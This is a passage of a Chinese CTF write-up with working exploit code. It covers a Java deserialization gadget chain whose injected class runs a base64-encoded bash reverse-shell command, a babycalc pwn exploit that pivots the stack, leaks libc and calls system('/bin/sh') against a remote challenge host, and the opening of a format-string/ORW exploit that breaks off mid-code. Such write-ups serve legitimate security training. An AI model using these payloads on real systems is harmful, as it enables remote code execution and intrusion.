</span></span><span style="display:flex;"><span>                field <span style="color:#f92672">=</span> getField<span style="color:#f92672">(</span>clazz<span style="color:#f92672">.</span><span style="color:#a6e22e">getSuperclass</span><span style="color:#f92672">(),</span> fieldName<span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> field<span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">setFieldValue</span><span style="color:#f92672">(</span><span style="color:#66d9ef">final</span> Object obj<span style="color:#f92672">,</span> <span style="color:#66d9ef">final</span> String fieldName<span style="color:#f92672">,</span> <span style="color:#66d9ef">final</span> Object value<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> Exception <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">final</span> Field field <span style="color:#f92672">=</span> getField<span style="color:#f92672">(</span>obj<span style="color:#f92672">.</span><span style="color:#a6e22e">getClass</span><span style="color:#f92672">(),</span> fieldName<span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>        field<span style="color:#f92672">.</span><span style="color:#a6e22e">set</span><span style="color:#f92672">(</span>obj<span style="color:#f92672">,</span> value<span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span><span style="color:#f92672">(</span>String<span style="color:#f92672">[]</span> args<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> Exception<span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        TemplatesImpl templates <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TemplatesImpl<span style="color:#f92672">();</span>
</span></span><span style="display:flex;"><span>        setFieldValue<span style="color:#f92672">(</span>templates<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;_bytecodes&#34;</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[][]{</span>
</span></span><span style="display:flex;"><span>                ClassPool<span style="color:#f92672">.</span><span style="color:#a6e22e">getDefault</span><span style="color:#f92672">().</span><span style="color:#a6e22e">get</span><span style="color:#f92672">(</span>fucktemplate<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getName</span><span style="color:#f92672">()).</span><span style="color:#a6e22e">toBytecode</span><span style="color:#f92672">()</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">});</span>
</span></span><span style="display:flex;"><span>        setFieldValue<span style="color:#f92672">(</span>templates<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;_name&#34;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;fucktemplate&#34;</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>        setFieldValue<span style="color:#f92672">(</span>templates<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;_class&#34;</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>        JSONObject jsonObject <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> JSONObject<span style="color:#f92672">();</span>
</span></span><span style="display:flex;"><span>        jsonObject<span style="color:#f92672">.</span><span style="color:#a6e22e">put</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;jb&#34;</span><span style="color:#f92672">,</span> templates<span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>        HashMap<span style="color:#f92672">&lt;</span>Object<span style="color:#f92672">,</span> Object<span style="color:#f92672">&gt;</span> s <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashMap<span style="color:#f92672">&lt;&gt;();</span>
</span></span><span style="display:flex;"><span>        setFieldValue<span style="color:#f92672">(</span>s<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;size&#34;</span><span style="color:#f92672">,</span> 2<span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>        Class<span style="color:#f92672">&lt;?&gt;</span> nodeC<span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>            nodeC <span style="color:#f92672">=</span> Class<span style="color:#f92672">.</span><span style="color:#a6e22e">forName</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;java.util.HashMap$Node&#34;</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span> ClassNotFoundException e <span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>            nodeC <span style="color:#f92672">=</span> Class<span style="color:#f92672">.</span><span style="color:#a6e22e">forName</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;java.util.HashMap$Entry&#34;</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>        Constructor<span style="color:#f92672">&lt;?&gt;</span> nodeCons <span style="color:#f92672">=</span> nodeC<span style="color:#f92672">.</span><span style="color:#a6e22e">getDeclaredConstructor</span><span style="color:#f92672">(</span><span style="color:#66d9ef">int</span><span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">,</span> Object<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">,</span> Object<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">,</span> nodeC<span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>        nodeCons<span style="color:#f92672">.</span><span style="color:#a6e22e">setAccessible</span><span style="color:#f92672">(</span><span style="color:#66d9ef">true</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>        Object tbl <span style="color:#f92672">=</span> Array<span style="color:#f92672">.</span><span style="color:#a6e22e">newInstance</span><span style="color:#f92672">(</span>nodeC<span style="color:#f92672">,</span> 2<span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>        HotSwappableTargetSource v1 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HotSwappableTargetSource<span style="color:#f92672">(</span>jsonObject<span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>        HotSwappableTargetSource v2 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HotSwappableTargetSource<span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> XString<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;xxx&#34;</span><span style="color:#f92672">));</span>
</span></span><span style="display:flex;"><span>        Array<span style="color:#f92672">.</span><span style="color:#a6e22e">set</span><span style="color:#f92672">(</span>tbl<span style="color:#f92672">,</span> 0<span style="color:#f92672">,</span> nodeCons<span style="color:#f92672">.</span><span style="color:#a6e22e">newInstance</span><span style="color:#f92672">(</span>0<span style="color:#f92672">,</span> v1<span style="color:#f92672">,</span> v1<span style="color:#f92672">,</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">));</span>
</span></span><span style="display:flex;"><span>        Array<span style="color:#f92672">.</span><span style="color:#a6e22e">set</span><span style="color:#f92672">(</span>tbl<span style="color:#f92672">,</span> 1<span style="color:#f92672">,</span> nodeCons<span style="color:#f92672">.</span><span style="color:#a6e22e">newInstance</span><span style="color:#f92672">(</span>0<span style="color:#f92672">,</span> v2<span style="color:#f92672">,</span> v2<span style="color:#f92672">,</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">));</span>
</span></span><span style="display:flex;"><span>        setFieldValue<span style="color:#f92672">(</span>s<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;table&#34;</span><span style="color:#f92672">,</span> tbl<span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span><span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>            ByteArrayOutputStream byteArrayOutputStream <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ByteArrayOutputStream<span style="color:#f92672">();</span>
</span></span><span style="display:flex;"><span>            ObjectOutputStream outputStream <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectOutputStream<span style="color:#f92672">(</span>byteArrayOutputStream<span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>            outputStream<span style="color:#f92672">.</span><span style="color:#a6e22e">writeObject</span><span style="color:#f92672">(</span>s<span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>            System<span style="color:#f92672">.</span><span style="color:#a6e22e">out</span><span style="color:#f92672">.</span><span style="color:#a6e22e">println</span><span style="color:#f92672">(</span>URLEncoder<span style="color:#f92672">.</span><span style="color:#a6e22e">encode</span><span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> String<span style="color:#f92672">(</span>Base64<span style="color:#f92672">.</span><span style="color:#a6e22e">getEncoder</span><span style="color:#f92672">().</span><span style="color:#a6e22e">encode</span><span style="color:#f92672">(</span>byteArrayOutputStream<span style="color:#f92672">.</span><span style="color:#a6e22e">toByteArray</span><span style="color:#f92672">())),</span><span style="color:#e6db74">&#34;UTF-8&#34;</span><span style="color:#f92672">));</span>
</span></span><span style="display:flex;"><span>            outputStream<span style="color:#f92672">.</span><span style="color:#a6e22e">close</span><span style="color:#f92672">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span><span style="color:#66d9ef">catch</span><span style="color:#f92672">(</span>Exception e<span style="color:#f92672">){</span>
</span></span><span style="display:flex;"><span>            e<span style="color:#f92672">.</span><span style="color:#a6e22e">printStackTrace</span><span style="color:#f92672">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
</span></span></code></pre></div><p>fucktemplate部分：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">package</span> com.example<span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM<span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException<span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet<span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator<span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler<span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">fucktemplate</span> <span style="color:#66d9ef">extends</span> AbstractTranslet <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">fucktemplate</span><span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">super</span><span style="color:#f92672">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>            Runtime<span style="color:#f92672">.</span><span style="color:#a6e22e">getRuntime</span><span style="color:#f92672">().</span><span style="color:#a6e22e">exec</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;bash -c {echo,YmFzaCAtaS***==}|{base64,-d}|{bash,-i}&#34;</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span><span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>Exception e<span style="color:#f92672">){</span>
</span></span><span style="display:flex;"><span>            e<span style="color:#f92672">.</span><span style="color:#a6e22e">printStackTrace</span><span style="color:#f92672">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">transform</span><span style="color:#f92672">(</span>DOM document<span style="color:#f92672">,</span> SerializationHandler<span style="color:#f92672">[]</span> handlers<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> TransletException <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">transform</span><span style="color:#f92672">(</span>DOM document<span style="color:#f92672">,</span> DTMAxisIterator iterator<span style="color:#f92672">,</span> SerializationHandler handler<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> TransletException <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
</span></span></code></pre></div><h2 id="pwn">Pwn</h2>
<h3 id="babycalc">babycalc</h3>
<p>z3解方程</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> z3 <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>v3,v4,v5,v6,v7,v8,v9,v10,v11,v12,v13,v14,v15,v16,v17,v18<span style="color:#f92672">=</span>Ints(<span style="color:#e6db74">&#39;v3 v4 v5 v6 v7 v8 v9 v10 v11 v12 v13 v14 v15 v16 v17 v18&#39;</span>)
</span></span><span style="display:flex;"><span>solver <span style="color:#f92672">=</span> Solver()
</span></span><span style="display:flex;"><span>solver<span style="color:#f92672">.</span>add(v5 <span style="color:#f92672">*</span> v4 <span style="color:#f92672">*</span> v3 <span style="color:#f92672">-</span> v6 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x8D56</span>)
</span></span><span style="display:flex;"><span>solver<span style="color:#f92672">.</span>add(v3 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x13</span>)
</span></span><span style="display:flex;"><span>solver<span style="color:#f92672">.</span>add(v5 <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x13</span> <span style="color:#f92672">*</span> v4 <span style="color:#f92672">+</span> v6 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x8DE2</span>)
</span></span><span style="display:flex;"><span>solver<span style="color:#f92672">.</span>add((v13 <span style="color:#f92672">+</span> v3 <span style="color:#f92672">-</span> v8) <span style="color:#f92672">*</span> v16 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x8043</span>)
</span></span><span style="display:flex;"><span>solver<span style="color:#f92672">.</span>add((v5 <span style="color:#f92672">+</span> v4 <span style="color:#f92672">*</span> v3) <span style="color:#f92672">*</span> v6 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xC986</span>)
</span></span><span style="display:flex;"><span>solver<span style="color:#f92672">.</span>add(v9 <span style="color:#f92672">*</span> v8 <span style="color:#f92672">*</span> v7 <span style="color:#f92672">-</span> v10 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xF06D</span>)
</span></span><span style="display:flex;"><span>solver<span style="color:#f92672">.</span>add(v10 <span style="color:#f92672">*</span> v15 <span style="color:#f92672">+</span> v4 <span style="color:#f92672">+</span> v18 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x4A5D</span>)
</span></span><span style="display:flex;"><span>solver<span style="color:#f92672">.</span>add(v9 <span style="color:#f92672">*</span> v8 <span style="color:#f92672">*</span> v7 <span style="color:#f92672">+</span> v10 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xF1AF</span>)
</span></span><span style="display:flex;"><span>solver<span style="color:#f92672">.</span>add((v8 <span style="color:#f92672">*</span> v7 <span style="color:#f92672">-</span> v9) <span style="color:#f92672">*</span> v10 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x8E03D</span>)
</span></span><span style="display:flex;"><span>solver<span style="color:#f92672">.</span>add(v11 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x32</span>)
</span></span><span style="display:flex;"><span>solver<span style="color:#f92672">.</span>add((v9 <span style="color:#f92672">+</span> v8 <span style="color:#f92672">*</span> v7) <span style="color:#f92672">*</span> v10 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x8F59F</span>)
</span></span><span style="display:flex;"><span>solver<span style="color:#f92672">.</span>add(v13 <span style="color:#f92672">*</span> v12 <span style="color:#f92672">*</span> v11 <span style="color:#f92672">-</span> v14 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x152FD3</span>)
</span></span><span style="display:flex;"><span>solver<span style="color:#f92672">.</span>add(v13 <span style="color:#f92672">*</span> v12 <span style="color:#f92672">*</span> v11 <span style="color:#f92672">+</span> v14 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x15309D</span>)
</span></span><span style="display:flex;"><span>solver<span style="color:#f92672">.</span>add((v12 <span style="color:#f92672">*</span> v11 <span style="color:#f92672">-</span> v13) <span style="color:#f92672">*</span> v14 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x9C48A</span>)
</span></span><span style="display:flex;"><span>solver<span style="color:#f92672">.</span>add((v11 <span style="color:#f92672">*</span> v5 <span style="color:#f92672">-</span> v16) <span style="color:#f92672">*</span> v12 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x4E639</span>)
</span></span><span style="display:flex;"><span>solver<span style="color:#f92672">.</span>add((v13 <span style="color:#f92672">+</span> v12 <span style="color:#f92672">*</span> v11) <span style="color:#f92672">*</span> v14 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xA6BD2</span>)
</span></span><span style="display:flex;"><span>solver<span style="color:#f92672">.</span>add(v17 <span style="color:#f92672">*</span> v16 <span style="color:#f92672">*</span> v15 <span style="color:#f92672">-</span> v18 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x8996D</span>)
</span></span><span style="display:flex;"><span>solver<span style="color:#f92672">.</span>add(v17 <span style="color:#f92672">*</span> v16 <span style="color:#f92672">*</span> v15 <span style="color:#f92672">+</span> v18 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x89973</span>)
</span></span><span style="display:flex;"><span>solver<span style="color:#f92672">.</span>add(v14 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x65</span>)
</span></span><span style="display:flex;"><span>solver<span style="color:#f92672">.</span>add((v16 <span style="color:#f92672">*</span> v15 <span style="color:#f92672">-</span> v17) <span style="color:#f92672">*</span> v18 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x112E6</span>)
</span></span><span style="display:flex;"><span>solver<span style="color:#f92672">.</span>add((v17 <span style="color:#f92672">+</span> v16 <span style="color:#f92672">*</span> v15) <span style="color:#f92672">*</span> v18 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x11376</span>)
</span></span><span style="display:flex;"><span>print(solver<span style="color:#f92672">.</span>check())
</span></span><span style="display:flex;"><span>print(solver<span style="color:#f92672">.</span>model())
</span></span></code></pre></div><p>输入0x100字节能覆盖rbp的最低位为零，这个地址有几率落在buf里。buf溢出控制i能实现向前无数字节改写和向后一字节改写，改写返回地址为一个leave ret指令栈迁移泄露libc然后返回0x400c1b再来一次栈迁移执行system(&rsquo;/bin/sh')</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#from LibcSearcher import *</span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;amd64&#39;</span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>os <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;linux&#39;</span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;debug&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">=</span>remote(<span style="color:#e6db74">&#39;tcp.cloud.dasctf.com&#39;</span>,<span style="color:#ae81ff">24101</span>)
</span></span><span style="display:flex;"><span><span style="color:#75715e">#p=process(&#39;./babycalc&#39;)</span>
</span></span><span style="display:flex;"><span>elf<span style="color:#f92672">=</span>ELF(<span style="color:#e6db74">&#39;./babycalc&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#75715e">#gdb.attach(p)</span>
</span></span><span style="display:flex;"><span>v<span style="color:#f92672">=</span>[<span style="color:#ae81ff">19</span>,<span style="color:#ae81ff">36</span>,<span style="color:#ae81ff">53</span>,<span style="color:#ae81ff">70</span>,<span style="color:#ae81ff">55</span>,<span style="color:#ae81ff">66</span>,<span style="color:#ae81ff">17</span>,<span style="color:#ae81ff">161</span>,<span style="color:#ae81ff">50</span>,<span style="color:#ae81ff">131</span>,<span style="color:#ae81ff">212</span>,<span style="color:#ae81ff">101</span>,<span style="color:#ae81ff">118</span>,<span style="color:#ae81ff">199</span>,<span style="color:#ae81ff">24</span>,<span style="color:#ae81ff">3</span>]
</span></span><span style="display:flex;"><span>s<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> v:
</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">+=</span>i<span style="color:#f92672">.</span>to_bytes(<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#39;little&#39;</span>)
</span></span><span style="display:flex;"><span>print(s)
</span></span><span style="display:flex;"><span>ret_addr<span style="color:#f92672">=</span><span style="color:#ae81ff">0x400c19</span>
</span></span><span style="display:flex;"><span>pop_rdi<span style="color:#f92672">=</span><span style="color:#ae81ff">0x400ca3</span>
</span></span><span style="display:flex;"><span>payload<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;24&#39;</span><span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">6</span><span style="color:#f92672">+</span>p64(ret_addr)<span style="color:#f92672">*</span><span style="color:#ae81ff">21</span><span style="color:#f92672">+</span>p64(pop_rdi)<span style="color:#f92672">+</span>p64(elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;puts&#39;</span>])<span style="color:#f92672">+</span>p64(elf<span style="color:#f92672">.</span>plt[<span style="color:#e6db74">&#39;puts&#39;</span>])<span style="color:#f92672">+</span>p64(<span style="color:#ae81ff">0x400c1b</span>)<span style="color:#f92672">+</span>s<span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">28</span><span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x38</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00\x00\x00</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;number-1:&#39;</span>,payload)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;good done</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#leak libc</span>
</span></span><span style="display:flex;"><span>x<span style="color:#f92672">=</span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>puts_addr<span style="color:#f92672">=</span>u64(x)
</span></span><span style="display:flex;"><span>print(hex(u64(x)))
</span></span><span style="display:flex;"><span><span style="color:#75715e">#libc=LibcSearcher(&#34;puts&#34;,puts_addr)</span>
</span></span><span style="display:flex;"><span>libcbase<span style="color:#f92672">=</span>u64(x)<span style="color:#f92672">-</span><span style="color:#ae81ff">0x06f6a0</span>
</span></span><span style="display:flex;"><span>print(hex(libcbase))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#system(&#39;/bin/sh&#39;)</span>
</span></span><span style="display:flex;"><span>system_addr<span style="color:#f92672">=</span>libcbase<span style="color:#f92672">+</span><span style="color:#ae81ff">0x0453a0</span>
</span></span><span style="display:flex;"><span>bin_sh_addr<span style="color:#f92672">=</span>libcbase<span style="color:#f92672">+</span><span style="color:#ae81ff">0x18ce57</span>
</span></span><span style="display:flex;"><span>shellcode<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;24&#39;</span><span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">6</span><span style="color:#f92672">+</span>p64(ret_addr)<span style="color:#f92672">*</span><span style="color:#ae81ff">22</span><span style="color:#f92672">+</span>p64(pop_rdi)<span style="color:#f92672">+</span>p64(bin_sh_addr)<span style="color:#f92672">+</span>p64(system_addr)<span style="color:#f92672">+</span>s<span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">28</span><span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x38</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">3</span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>send(shellcode)
</span></span><span style="display:flex;"><span><span style="color:#75715e">#p.recvuntil(b&#39;good done\n&#39;)</span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
</span></span><span style="display:flex;"><span><span style="color:#75715e">#pause()</span>
</span></span></code></pre></div><h3 id="message-board">Message Board</h3>
<p>给了一个只能用一次的格式化字符串，一个长度足够长溢出0x10字节的栈可以用来做frame faking，泄露libc，题目中有沙箱，构造orw拿到flag</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
</span></span><span style="display:flex;"><span>context(os<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;linux&#39;</span>, arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;amd64&#39;</span>, log_level<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;debug&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">2</span>:
</span></span><span style="display:flex;"><span>    debug <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>    debug <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> debug:
</span></span><span style="display:flex;"><span>    p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./pwn&#34;</span>)
</span></span><span style="display:flex;"><span>    libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;/lib/x86_64-linux-gnu/libc-2.31.so&#34;</span>)
